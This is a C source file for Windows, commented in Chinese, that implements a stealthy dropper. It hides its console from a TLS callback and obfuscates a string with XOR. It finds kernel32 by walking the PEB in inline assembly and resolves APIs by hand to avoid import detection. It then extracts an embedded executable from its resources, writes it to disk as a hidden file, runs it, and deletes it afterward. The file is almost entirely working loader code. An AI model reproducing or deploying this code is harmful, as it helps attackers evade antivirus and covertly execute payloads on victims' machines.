#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <string.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib,"ntdll.lib")

char MyExportName[20][30] = {
    "FindResourceA",
	"LoadResource",
	"LockResource",
	"SizeofResource",
    "CreateFileA",
    "GetModuleFileNameA",
    "WriteFile",
    "CloseHandle",
    "WaitForSingleObject",
    "DeleteFileA",
    "SetFileAttributesA"
};

void NTAPI __stdcall TLS_CALLBACK(PVOID DllHandle, DWORD Reason, PVOID Reserved)
{
	// 隐藏控制台窗口
	ShowWindow(GetConsoleWindow(), SW_HIDE);
    char a[] = {-35, -121, -43, -81, -88, -52, -94, -123, -45, -94, -86, -118};
    char out[14] = { 0 };
	for (int i = 0; i < 12; i++) {
		out[i] = a[i] ^ 0x66;
	}
	// 隐藏控制台窗口标题
	SetConsoleTitleA(out);
}

//linker spec通知链接器PE文件要创建TLS目录，注意X86和X64的区别
#ifdef _M_IX86
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")
#else
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback")
#endif
//创建TLS段
EXTERN_C
#ifdef _M_X64
#pragma const_seg (".CRT$XLB")
const
#else
#pragma data_seg (".CRT$XLB")
#endif
//end linker

//tls import定义多个回调函数
PIMAGE_TLS_CALLBACK _tls_callback[] = { TLS_CALLBACK, 0 };
#pragma data_seg ()
#pragma const_seg ()
//end


DWORD MyGetKennel32(DWORD kenneth) {
	if (kenneth == NULL) {
		__asm{
			mov eax, dword ptr fs:[0x30]
			mov eax, dword ptr[eax + 0xc]
			mov eax, dword ptr[eax + 0xc]
			mov eax, dword ptr[eax]
			mov eax, dword ptr[eax]
			mov eax, dword ptr[eax + 0x18]
			mov dword ptr[kenneth], eax
		}
	}
	return kenneth;
}

DWORD MyGetProcAddress(HMODULE hModule, int index) {
	LPCSTR name = (LPCSTR)MyExportName[index];
	int i=0;
    char *pRet = NULL;
    PIMAGE_DOS_HEADER pImageDosHeader = NULL;
    PIMAGE_NT_HEADERS pImageNtHeader = NULL;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
     
    pImageDosHeader=(PIMAGE_DOS_HEADER)hModule;
    pImageNtHeader=(PIMAGE_NT_HEADERS)((DWORD)hModule+pImageDosHeader->e_lfanew);
    pImageExportDirectory=(PIMAGE_EXPORT_DIRECTORY)((DWORD)hModule+pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
    DWORD dwExportRVA = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD dwExportSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
     
    DWORD *pAddressOfFunction = (DWORD*)(pImageExportDirectory->AddressOfFunctions + (DWORD)hModule);
    DWORD *pAddressOfNames = (DWORD*)(pImageExportDirectory->AddressOfNames + (DWORD)hModule);
    DWORD dwNumberOfNames = (DWORD)(pImageExportDirectory->NumberOfNames);
    DWORD dwBase = (DWORD)(pImageExportDirectory->Base);
     
    WORD *pAddressOfNameOrdinals = (WORD*)(pImageExportDirectory->AddressOfNameOrdinals + (DWORD)hModule);
     
    //这个是查一下是按照什么方式（函数名称or函数序号）来查函数地址的
    DWORD dwName = (DWORD)name;
    if ((dwName & 0xFFFF0000) == 0)
    {
        goto xuhao;
    }
     
    for (i=0; i<(int)dwNumberOfNames; i++)
    {
        char *strFunction = (char *)(pAddressOfNames[i] + (DWORD)hModule);
        if (strcmp(strFunction, (char *)name) == 0)
        {
            pRet = (char *)(pAddressOfFunction[pAddressOfNameOrdinals[i]] + (DWORD)hModule);
            goto _exit11;
        }
    }
    //这个是通过以序号的方式来查函数地址的
xuhao:
    if (dwName < dwBase || dwName > dwBase + pImageExportDirectory->NumberOfFunctions - 1)
    {
        return 0;
    }
    pRet = (char *)(pAddressOfFunction[dwName - dwBase] + (DWORD)hModule);
_exit11:
       //判断得到的地址有没有越界
    if ((DWORD)pRet<dwExportRVA+(DWORD)hModule || (DWORD)pRet > dwExportRVA+ (DWORD)hModule + dwExportSize)
    {
        return (DWORD)pRet;
    }
    char pTempDll[100] = {0};
    char pTempFuction[100] = {0};
    lstrcpy(pTempDll, pRet);
    char *p = strchr(pTempDll, '.');
    if (!p)
    {
        return (DWORD)pRet;
    }
    *p = 0;
    lstrcpy(pTempFuction, p+1);
    lstrcat(pTempDll, ".dll");
    HMODULE h = LoadLibrary(pTempDll);
    if (h == NULL)
    {
        return (DWORD)pRet;
    }
    return MyGetProcAddress(h, pTempFuction);
}

// 从资源文件中释放exe并执行
void MyFreeExe() {
    DWORD kennel32 = NULL;
    kennel32 = MyGetKennel32(kennel32);
    
	// 从资源中获取exe
    
    //FindResourceA  
	//HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(108), "EXE");
	DWORD v1 = MyGetProcAddress(kennel32, 0);
	HRSRC hRes = ((HRSRC(__stdcall*)(HMODULE, LPCSTR, LPCSTR))v1)(NULL, MAKEINTRESOURCE(109), "EXE");
	if (hRes == NULL) {
		return;
	}
    
    //LoadResource
	//HGLOBAL hResLoad = LoadResource(NULL, hRes);
    DWORD v2 = MyGetProcAddress(kennel32, 1);
	HGLOBAL hResLoad = ((HGLOBAL(__stdcall*)(HMODULE, HRSRC))v2)(NULL, hRes);
	
    //SizeofResource
    //DWORD dwSize = SizeofResource(NULL, hRes);
	DWORD v3 = MyGetProcAddress(kennel32, 3);
	DWORD dwSize = ((DWORD(__stdcall*)(HMODULE, HRSRC))v3)(NULL, hRes);

	//LockResource
	//LPVOID lpResLock = LockResource(hResLoad);
	DWORD v4 = MyGetProcAddress(kennel32, 2);
	LPVOID lpResLock = ((LPVOID(__stdcall*)(HGLOBAL))v4)(hResLoad);
    
	// 释放exe
	DWORD dwWrite = 0;
    
	//CreateFileA
	//HANDLE hFile = CreateFileA("./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD v5 = MyGetProcAddress(kennel32, 4);
	HANDLE hFile = ((HANDLE(__stdcall*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))v5)("./Seele.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    //获得文件路径
	char szFilePath[MAX_PATH] = { 0 };

	//GetModuleFileNameA
	//GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
	DWORD v6 = MyGetProcAddress(kennel32, 5);
	((DWORD(__stdcall*)(HMODULE, LPSTR, DWORD))v6)(NULL, szFilePath, MAX_PATH);

	//去掉文件名，只留路径
	PathRemoveFileSpecA(szFilePath);
	strcat(szFilePath, "\\Seele.exe");
    printf("%s\n", szFilePath);
    
	//WriteFile
    //WriteFile(hFile, lpResLock, dwSize, &dwWrite, NULL);
	DWORD v7 = MyGetProcAddress(kennel32, 6);
	((DWORD(__stdcall*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))v7)(hFile, lpResLock, dwSize, &dwWrite, NULL);
    
	//CloseHandle
	//CloseHandle(hFile);
	DWORD v8 = MyGetProcAddress(kennel32, 7);
	((DWORD(__stdcall*)(HANDLE))v8)(hFile);
    
    //将生成出来的exe设置为隐藏
	DWORD v11 = MyGetProcAddress(kennel32, 10);
	((DWORD(__stdcall*)(LPCSTR, DWORD))v11)(szFilePath, FILE_ATTRIBUTE_HIDDEN);
    
    SHELLEXECUTEINFO shellinfo = { 0 };
	shellinfo.cbSize = sizeof(shellinfo);
	shellinfo.hwnd = NULL;
	shellinfo.lpVerb = "open";
	shellinfo.lpFile = szFilePath;			//此处写执行文件的路径
	//char tmp[100];								//命令行参数
	//sprintf_s(tmp, sizeof(tmp), "%d %d", 32, m_dwImageBase + m_dwCodeBase + begin);
    shellinfo.lpParameters = " ";
	shellinfo.nShow = SW_SHOWNORMAL;
	shellinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	BOOL bResult = ShellExecuteExA(&shellinfo);
	if ((int)shellinfo.hInstApp <= 32)
	{
		printf("执行text.exe失败，错误代码：%d\n", GetLastError());
		return 0;
	}
    //WaitForSingleObject
	//WaitForSingleObject(shellinfo.hProcess, INFINITE);
	DWORD v9 = MyGetProcAddress(kennel32, 8);
	((DWORD(__stdcall*)(HANDLE, DWORD))v9)(shellinfo.hProcess, INFINITE);

    //删除exe
    //DeleteFileA
	//DeleteFileA(szFilePath);
	DWORD v10 = MyGetProcAddress(kennel32, 9);
	((DWORD(__stdcall*)(LPCSTR))v10)(szFilePath);
}

int main() {
	// Creating a new branch is quick.
        //  test
	// test114514
    MyFreeExe();
	return 0;
}
